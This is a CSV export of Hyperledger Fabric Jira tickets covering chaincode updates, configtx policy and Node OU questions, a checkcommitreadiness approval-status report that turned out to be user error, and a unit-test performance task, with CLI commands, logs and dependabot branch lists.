regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"13/Feb/20 12:17 AM;dongming;[https://github.com/hyperledger/fabric-test/pull/88];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update map_private chaincode to latest protos and shim,FAB-17500,44333,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,suryalnvs,suryalnvs,suryalnvs,13/Feb/20 6:37 AM,14/Feb/20 12:19 AM,28/Oct/23 3:09 AM,14/Feb/20 12:19 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,quality,,,,,Update map_private chaincode to latest protos and shim,,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zx",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),suryalnvs,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"14/Feb/20 12:19 AM;suryalnvs;https://github.com/hyperledger/fabric-test/pull/92;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Predefine a regulator or auditor for private data collection,FAB-17501,44338,,Story,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,huyinsong,huyinsong,13/Feb/20 9:49 PM,04/Dec/20 2:45 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,"Predefine a regulator or auditor, so that every private data collection will include this predefined regulator or auditor in the collection configuration. So users don’t need to define every private data collection to include it. It will be automatically included in every private data collection.

This could apply to explicitly defined collections and implicit collections.",,huyinsong,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb0zyw7",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),huyinsong,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Operator to support new lifecycle policies and endorsement policies when launching network with 2.0 application capabilities enabled in 2.0 network,FAB-17502,44341,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,suryalnvs,suryalnvs,suryalnvs,14/Feb/20 12:29 AM,15/Feb/20 5:32 AM,28/Oct/23 3:09 AM,15/Feb/20 5:32 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,quality,,,,,"Operator to support new lifecycle policies and endorsement policies when launching network with 2.0 application capabilities enabled in 2.0 network
{code:java}
Policies: &ApplicationDefaultPolicies        
  LifecycleEndorsement:            
    Type: ImplicitMeta            
    Rule: ""MAJORITY Endorsement""        
  Endorsement:            
    Type: ImplicitMeta            
    Rule: ""MAJORITY Endorsement""{code}",,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16240,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zr9",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),suryalnvs,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"15/Feb/20 5:32 AM;suryalnvs;https://github.com/hyperledger/fabric-test/pull/93;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add chaincode installation and committing using peer cli in operator when 2.0 application capabilities are enabled,FAB-17503,44354,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,suryalnvs,suryalnvs,suryalnvs,15/Feb/20 1:41 AM,28/Feb/20 12:52 AM,28/Oct/23 3:09 AM,28/Feb/20 12:52 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,quality,,,,,Add chaincode installation and committing using peer cli in operator when 2.0 application capabilities are enabled,,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16240,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzur",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),suryalnvs,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"22/Feb/20 7:03 AM;suryalnvs;https://github.com/hyperledger/fabric-test/pull/99;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update fabric-samples for OrdererEndpoints,FAB-17504,44355,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,xwu,denyeart,denyeart,15/Feb/20 4:37 AM,21/Mar/20 10:23 PM,28/Oct/23 3:09 AM,21/Mar/20 10:23 PM,,,,,,,,,,v2.1.0,,,,fabric-samples,,,,,,,,,0,,,,,,"The use of Orderer.Addresses in configtx.yaml is deprecated, as described in release notes and at
https://github.com/hyperledger/fabric/blob/master/sampleconfig/configtx.yaml#L263-L269

Organizations.<Org>.OrdererEndpoints should be used instead, as seen at:
https://github.com/hyperledger/fabric/blob/master/sampleconfig/configtx.yaml#L63-L66

Need to update all the fabric-samples configtx.yaml files to reflect this change as well.
",,denyeart,xwu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-7559,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0198j:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,xwu,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"15/Feb/20 8:28 PM;xwu;Do you mean to modify all the configtx files in hyperledger/fabric-samples(https://github.com/hyperledger/fabric-samples)? 
If this is the case, I can try to modify it.;;;","17/Feb/20 11:57 PM;denyeart;[~xwu] Yes, that's the intent. It would be greatly appreciated if you could work on it. Just assign to yourself when you start please. Thanks!;;;","21/Mar/20 10:23 PM;xwu;https://github.com/hyperledger/fabric-samples/pull/125;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Adding custom Node OUs with Hyperledger Fabric,FAB-17506,44358,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,chintanr11,chintanr11,chintanr11,17/Feb/20 2:53 PM,06/Mar/20 10:53 PM,28/Oct/23 3:09 AM,06/Mar/20 10:53 PM,v1.4.3,,,,,,,,,,,,,fabric-ca,,,,,,,,,0,Documentation,MembershipServices,,,,"I am trying to add custom Node OU in policy definition inside the *configtx.yaml* file. The policy definition is present in Application section of configtx.yaml file as follows:


{code:java}
Application: &ApplicationDefaults

# Organizations is the list of orgs which are defined as participants on
# the application side of the network
ACLs: &ACLsDefault
    peer/Propose: /Channel/Application/Checkous

Organizations:

# Policies defines the set of policies at this level of the config tree
# For Application policies, their canonical path is
#   /Channel/Application/<PolicyName>
Policies:
    Readers:
        Type: ImplicitMeta
        Rule: ""ANY Readers""
    Writers:
        Type: ImplicitMeta
        Rule: ""ANY Writers""
    Admins:
        Type: ImplicitMeta
        Rule: ""MAJORITY Admins""
    Checkous:
        Type: Signature
        Rule: ""OR('Org1MSP.admin', 'Org1MSP.client', 'Org1MSP.dept')""

Capabilities:
    <<: *ApplicationCapabilities

{code}

I already generated the crypto-material using cryptogen tool. As you can see I am also using the custom policy inside one of the ACLs.

Next, I created the orderer genesis block. Followed by which, when I try to create channel configuration block, I receive the following error:


{code:java}
#################################################################
### Generating channel configuration transaction 'channel.tx' ###
#################################################################
+ configtxgen -profile TwoOrgsChannel -outputCreateChannelTx ./channel-artifacts/channel.tx -channelID mychannel
2020-02-17 05:17:02.346 UTC [common.tools.configtxgen] main -> INFO 001 Loading configuration
2020-02-17 05:17:02.518 UTC [common.tools.configtxgen.localconfig] Load -> INFO 002 Loaded configuration: /home/chintanr11/fabric-samples/first-network/configtx.yaml
2020-02-17 05:17:02.680 UTC [common.tools.configtxgen.localconfig] completeInitialization -> INFO 003 orderer type: solo
2020-02-17 05:17:02.680 UTC [common.tools.configtxgen.localconfig] LoadTopLevel -> INFO 004 Loaded configuration: /home/chintanr11/fabric-samples/first-network/configtx.yaml
2020-02-17 05:17:02.680 UTC [common.tools.configtxgen] doOutputChannelCreateTx -> INFO 005 Generating new channel configtx
2020-02-17 05:17:02.680 UTC [common.tools.configtxgen] main -> FATA 006 Error on outputChannelCreateTx: could not generate default config template: error parsing configuration: could not create application group: error adding policies to application group: invalid signature policy rule 'OR('Org1MSP.admin', 'Org1MSP.client', 'Org1MSP.dept')': Unable to parse numeric value '.' to float64
+ res=1
+ set +x
Failed to generate channel configuration transaction...
{code}

NOTE: I have added the definition for this OU in my config.yaml file located at: ~/fabric-samples/first-network/crypto-config/peerOrganizations/org1.example.com/msp. The file looks as follows:


{code:java}
OrganizationalUnitIdentifiers:
  - Certificate: ""cacerts/ca.org1.example.com-cert.pem""
    OrganizationalUnitIdentifier: ""dept""

NodeOUs:
  Enable: true
  ClientOUIdentifier:
    Certificate: cacerts/ca.org1.example.com-cert.pem
    OrganizationalUnitIdentifier: client
  PeerOUIdentifier:
    Certificate: cacerts/ca.org1.example.com-cert.pem
    OrganizationalUnitIdentifier: peer
  AdminOUIdentifier:
    Certificate: cacerts/ca.org1.example.com-cert.pem
    OrganizationalUnitIdentifier: admin
  OrdererOUIdentifier:
    Certificate: cacerts/ca.org1.example.com-cert.pem
    OrganizationalUnitIdentifier: orderer
{code}

1. What does the above error in channel block creation mean and any solution to resolve it?
2. How to possibly use custom Node OUs in the network using Fabric CA (and not cryptogen)?",,chintanr11,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01997:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),chintanr11,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Feb/20 1:56 PM;chintanr11;I learnt that Hyperledger Fabric does not provide custom OU support in profile section. But the documentation at [https://hyperledger-fabric.readthedocs.io/en/master/msp.html#best-practices] suggests in point number 2.1 that we can define policies which capture the custom OUs of the identity.

_Configuration of that MSP would consist of a list of root CAs, intermediate CAs and admin certificates; and membership identities would include the organizational unit ({{OU}}) a member belongs to. Policies can then be defined to capture members of a specific {{OU}}, and these policies may constitute the read/write policies of a channel or endorsement policies of a chaincode._

I request you to please make the required changes in the documentation.;;;","06/Mar/20 10:52 PM;chintanr11;The master docs is updated! Thank you!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
checkcommitreadiness error approval status problem,FAB-17507,44361,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Invalid: Works as Expected,,KevinXiong1977,KevinXiong1977,17/Feb/20 8:57 PM,17/Feb/21 1:06 AM,28/Oct/23 3:09 AM,24/Mar/20 11:02 PM,v2.0.0,,,,,,,,,,,,,,,,,,,,,,2,,,,,,"Sometimes, when we encounter the peer lifecycle chaincode checkcommitreadiness operation, we cannot get the correct approval status. The result is shown below:

docker exec -it cli sh

#Environment variables for +PEER0 in Org1+
CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp
CORE_PEER_ADDRESS=peer0.org1.example.com:7051
CORE_PEER_LOCALMSPID=""Org1MSP""
CORE_PEER_TLS_ROOTCERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt

*export ORDERER_CA*=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem
*export ORG1_CA*=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt
*export ORG2_CA*=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls/ca.crt

 

cd /root/go/src/github.com/hyperledger/fabric-samples/chaincode/marbles02_private/go

*GO111MODULE=on go mod vendor*

peer lifecycle chaincode package marblesp.tar.gz --path github.com/hyperledger/fabric-samples/chaincode/marbles02_private/go/ --lang golang --label marblespv1

 

peer lifecycle chaincode queryinstalled --output json
{
 ""installed_chaincodes"": [
 {
 ""package_id"": ""marblespv1:727cc9951bd288d6c6b1a2797e2234fb3f5ced4f58bbcf1e6364a932a083a998"",
 ""label"": ""marblespv1""
 }}

peer lifecycle chaincode checkcommitreadiness --channelID mychannel --name marblesp --version 1.0 --init-required --sequence 1 --tls true --cafile $ORDERER_CA --output json
{
 ""approvals"": {
 ""Org1MSP"": false,
 ""Org2MSP"": false
 }
}

 

peer lifecycle chaincode commit -o orderer.example.com:7050 --ordererTLSHostnameOverride orderer.example.com --channelID mychannel --name marblesp --version 1.0 --sequence 1 --collections-config /opt/gopath/src/github.com/hyperledger/fabric-samples/chaincode/marbles02_private/collections_config.json --signature-policy ""OR('Org1MSP.member','Org2MSP.member')"" --init-required --tls true --cafile $ORDERER_CA --peerAddresses peer0.org1.example.com:7051 --tlsRootCertFiles $ORG1_CA --peerAddresses peer0.org2.example.com:9051 --tlsRootCertFiles $ORG2_CA
Error: proposal failed with status: 500 - failed to invoke backing implementation of 'CommitChaincodeDefinition': {color:#FF0000}chaincode definition not agreed to by this org (Org1MSP){color}

peer lifecycle chaincode approveformyorg -o orderer.example.com:7050 --ordererTLSHostnameOverride orderer.example.com --channelID mychannel --name marblesp --version 1.0 --collections-config /opt/gopath/src/github.com/hyperledger/fabric-samples/chaincode/marbles02_private/collections_config.json --signature-policy ""OR('Org1MSP.member','Org2MSP.member')"" --init-required --package-id $CC_PACKAGE_ID --sequence 1 --tls true --cafile $ORDERER_CA
2020-02-17 11:17:47.244 UTC [chaincodeCmd] ClientWait -> INFO 001 txid [e6d7c62112a60202881b4be509c68fdfc1278057aab7ecbadb7abefe44161466] committed with status (VALID) at

{color:#FF0000}+*The peer lifecycle chaincode approveformyorg still shows that the approval status is Org1MSP: false, in fact it should be Org1MSP: true*+ {color}

peer lifecycle chaincode checkcommitreadiness --channelID mychannel --name marblesp --version 1.0 --init-required --sequence 1 --tls true --cafile $ORDERER_CA --output json
{
 ""approvals"": {
 *{color:#FF0000}""Org1MSP"": false,{color}*
 ""Org2MSP"": false
 }
}

{color:#0747a6}+*From the following peer lifecycle chaincode commit error prompt detection information, we can also correctly understand that Org1MSP has successfully performed the approveformyorg operation.*+{color}

peer lifecycle chaincode commit -o orderer.example.com:7050 --ordererTLSHostnameOverride orderer.example.com --channelID mychannel --name marblesp --version 1.0 --sequence 1 --collections-config /opt/gopath/src/github.com/hyperledger/fabric-samples/chaincode/marbles02_private/collections_config.json --signature-policy ""OR('Org1MSP.member','Org2MSP.member')"" --init-required --tls true --cafile $ORDERER_CA --peerAddresses peer0.org1.example.com:7051 --tlsRootCertFiles $ORG1_CA --peerAddresses peer0.org2.example.com:9051 --tlsRootCertFiles $ORG2_CA
Error: failed to create signed transaction: proposal response was not successful, error code 500, msg failed to invoke backing implementation of 'CommitChaincodeDefinition': *{color:#FF0000}chaincode definition not agreed to by this org (Org2MSP){color}*

 

 

 ",,bh4rtp,jarvis26,KevinXiong1977,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0199f:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),bh4rtp,jarvis26,KevinXiong1977,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Feb/20 5:37 PM;KevinXiong1977;peer lifecycle chaincode checkcommitreadiness --channelID mychannel --name marblesp --version 1.0 --init-required --sequence 3 --tls true --cafile $ORDERER_CA --output json

should be:

peer lifecycle chaincode checkcommitreadiness --channelID mychannel --name marblesp {color:#0747a6}*--signature-policy ""OR('Org1MSP.member','Org2MSP.member')""*{color}  --version 1.0 --init-required --sequence 3 --tls true --cafile $ORDERER_CA --output json;;;","23/Mar/20 11:08 PM;jarvis26;Encountered same issue. Are there any updates on this?;;;","24/Mar/20 4:45 PM;KevinXiong1977;Thank you, please close this issue. Maybe I'm mistaken, I forgot to specify *--signature-policy* when doing checkcommitreadiness. Actually it works, not a bug.;;;","17/Feb/21 1:06 AM;bh4rtp;I encountered this issue too. It is OK for Org1 but not for Org2. Do you fix it by change --sequence value?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improve the efficiency of viperutil.EnhancedExactUnmarshal,FAB-17508,44362,,Task,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,sykesm,sykesm,17/Feb/20 10:37 PM,01/Jul/20 10:20 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-common,,,,,,,,,0,help-wanted,,,,,"While executing unit tests, each call to EnhancedExactUnmarshal with a reference to genesisconfig.TopLevel takes over 4 seconds to complete. In aggregate, over 1600s (25 minutes) in our tests is spent in this function.

Improving the efficiency of this one function would likely result in a dramatic reduction in the amount of time it takes to execute unit tests.

[^elapsed.csv]",,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Feb/20 10:37 PM;sykesm;elapsed.csv;https://jira.hyperledger.org/secure/attachment/18133/elapsed.csv",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8zno",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,,,,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"22/May/20 3:39 AM;sykesm;FAB-17547 added a cache to the genesisconfig and localconfig packages to prevent reloading the same configuration in test. This meant we only pay the price of EnhancedExactUnmarshal once per test package.

While this is no longer urgent, the goal of this issue is to try to get underneath why this call is so expensive when the race detector is on and to attempt to address the root cause. No formal analysis has been done to my knowledge.

Alternatively, we are trying to move away from viper so the time may be better spent focusing on that.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
